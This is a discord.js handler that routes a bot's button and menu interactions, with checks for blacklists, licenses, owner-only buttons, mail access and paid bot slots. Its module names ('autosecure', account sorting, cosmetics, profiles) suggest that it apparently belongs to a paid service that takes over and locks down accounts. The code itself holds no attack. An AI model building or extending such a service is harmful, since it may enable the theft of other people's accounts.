const isblacklisted = require('../../../db/blacklist');
const getButtons = require('../../utils/getButtons');
const { queryParams } = require('../../../db/database');
const accountsmsg = require('../../../autosecure/utils/accounts/accountsmsg');
const config = require("../../../config.json");
const { ChannelType, PermissionsBitField, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const isOwner = require('../../../db/isOwner');
const access = require("../../../db/access")
const listConfiguration = require('../../../autosecure/utils/settings/listConfiguration');
const { handleCopyButton, handleCloseButton } = require('../../utils/purchase/purchasethread');
const {
    handlesecureconfig,
    handlecosmetics,
    handleprofilesplit,
    checkBlacklist,
    handleSortAccounts,
    handletickets,
    handlesnewbot,
    handlesshowbot,
    showembedsmainbot
} = require("../../handlers/buttons/buttonhandlers");
const userpermissions = require('../../../autosecure/utils/embeds/userpermissions');
// Removed general button logging - only track essential operations

module.exports = async (client, interaction) => {
  if (!interaction.isButton() && !interaction.isStringSelectMenu()) {
    return;
  }

  const [userperms] = await userpermissions();

  const blacklistCheck = await checkBlacklist(interaction);
  if (blacklistCheck) {
    return;
  }

  if (interaction.isStringSelectMenu()) {
    const [action, ...params] = interaction.customId.split('|');
    if (action === 'profiles') {
      await handleprofilesplit(client, interaction);
      return;
    } 
    if (action === 'sort_accounts') {
      await handleSortAccounts(client, interaction, params);
      return;
    } 
    if (action === 'createticket') {
      await handletickets(client, interaction, params);
      return;
    }  
    if (action === 'toggleconfig') {
      await handlesecureconfig(interaction);
      return;
    }
    if (action === 'sort_cosmetics'){
      await handlecosmetics(client, interaction, params);
      return;
    } 
    if (action === 'embeds') {
      await showembedsmainbot(client, interaction, interaction.customId.split("|")[1], interaction.user.id);
      return;
    }
    if (action === "managebots") {
      const value = interaction.values[0].split('|')[0];
      if (value === 'purchaseslot') {
        const embed = new EmbedBuilder()
          .setColor('#d22b2b')
          .setDescription(`### You do not have an extra bot slot\n\nIf you wish to purchase one, you can purchase it from [here](${config.botslotslink}) and use \`/redeem\` to redeem it.`);
      
        const button = new ButtonBuilder()
          .setLabel('Buy license')
          .setStyle(ButtonStyle.Link)
          .setURL(config.botslotslink);
      
        const row = new ActionRowBuilder().addComponents(button);
      
        return interaction.reply({ embeds: [embed], components: [row], ephemeral: true });
      }      
      if (value === 'newbot') {
        await handlesnewbot(interaction)
        return
      } else {
        await handlesshowbot(interaction)
        return
      }
    }
  }

  const Buttons = getButtons(__dirname);

  try {
    let button;
    const [action, param, value] = interaction.customId.split('|');

    if (action === "action") {
      let actionData = await client.queryParams(`SELECT * FROM actions WHERE id=?`, [param]);
      if (actionData.length === 0) {
        return interaction.reply({
          embeds: [
            {
              title: `Error :x:`,
              description: `Please try again later!`,
              color: 0xff0000,
            },
          ],
          ephemeral: true,
        });
      }
      interaction.customId = actionData[0].action;
      button = client.buttons.find((btn) => btn.name === interaction.customId.split("|")[0]);
    } else {
      button = client.buttons.find((btn) => btn.name === action);
    }

    if (action === "purchaseclose"){
      await handleCloseButton(interaction, interaction.customId.split("|")[1])
    } else if (action === "purchasecopy"){
      const params = interaction.customId.split("|").slice(1).join("|");
      await handleCopyButton(interaction, params)
    }

    if (!button) {
      return;
    }

    if (button.mail) {
      const hasAccess = await access(interaction.user.id);
      if (!hasAccess) {
        let users = await queryParams(`SELECT * FROM users WHERE child=?`, [interaction.user.id]);
        if (users.length === 0) {
          return interaction.reply({ content: `You don't have access to mails! (no license / user of a bot)`, ephemeral: true });
        }
      }
    }

    if (button.userOnly){
      
      if (!await access(interaction.user.id)) {
        const embed = new EmbedBuilder()
          .setColor('#d22b2b')
          .setDescription(`### You do not have an active license\n\nIf you wish to purchase a subscription, you can purchase a 30d key from [here](${config.shoplink}) and use \`/redeem\` to redeem it.`)

        const button1 = new ButtonBuilder()
          .setLabel('Buy license')
          .setStyle(ButtonStyle.Link)
          .setURL(config.shoplink);

        const button2 = new ButtonBuilder()
          .setLabel('Join Server')
          .setCustomId('joinserver')
          .setStyle(ButtonStyle.Primary)

        const row = new ActionRowBuilder().addComponents(button1, button2);

        return interaction.reply({
          embeds: [embed],
          components: [row],
          ephemeral: true
        });
      }
    }

    for (const [buttonProp, { permission: dbPermission, description }] of Object.entries(userperms)) {
      if (button[buttonProp] && !await access(interaction.user.id)) {
        const button1 = new ButtonBuilder()
          .setLabel('Buy license')
          .setStyle(ButtonStyle.Link)
          .setURL(config.shoplink);

        const button2 = new ButtonBuilder()
          .setLabel('Join Server')
          .setCustomId('joinserver')
          .setStyle(ButtonStyle.Primary);

        const row = new ActionRowBuilder().addComponents(button1, button2);

        return interaction.reply({
          embeds: [
            new EmbedBuilder()
.setTitle("This button is only for managing your own bots, and you don't have access anymore!")
              .setColor('#d22b2b')
          ],
          components: [row],
          ephemeral: true
        });
      }
    }

    if (button.ownerOnly) {
      const isUserOwner = await isOwner(interaction.user.id);
      if (!isUserOwner) {
        return interaction.reply({ 
          content: "Invalid permissions! (owner only)", 
          ephemeral: true 
        });
      }
    }
    console.log(`${button.name}|${interaction.user.username}|Button|${interaction.customId}|${new Date().toISOString()}`);
    
    try {
      // Removed general button logging - only track essential operations
      await button.callback(client, interaction);
    } catch (error) {
      // Removed general button logging
      throw error;
    }
  } catch (e) {
    console.error(`[${new Date().toISOString()}] Error processing interaction:`, e);
  }
};